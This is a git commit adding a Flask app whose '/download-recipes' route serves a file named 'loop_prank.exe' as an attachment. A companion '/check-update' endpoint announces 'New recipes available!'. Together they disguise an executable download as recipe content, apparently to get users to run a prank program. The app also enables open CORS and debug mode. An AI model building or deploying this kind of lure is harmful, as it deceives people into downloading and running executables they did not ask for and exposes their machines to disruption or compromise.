4732771296c0ef346773179a07b46f71f7d18952
rajat1234567899 <130656822+rajat1234567899@users.noreply.github.com>
2025-06-01 21:48:35 +0530

    app.py

---
+++ app.py
@@ -0,0 +1,18 @@
+from flask import Flask, send_file, jsonify
+from flask_cors import CORS
+import os
+
+app = Flask(__name__)
+CORS(app)  # Allow all origins (for testing)
+
+@app.route('/download-recipes', methods=['GET'])
+def download_recipes():
+    file_path = os.path.join("files", "loop_prank.exe")
+    return send_file(file_path, as_attachment=True, download_name='loop_prank.exe')
+
+@app.route('/check-update', methods=['GET'])
+def check_update():
+    return jsonify({"message": "New recipes available!", "status": "ok"})
+
+if __name__ == '__main__':
+    app.run(debug=True, port=5000)
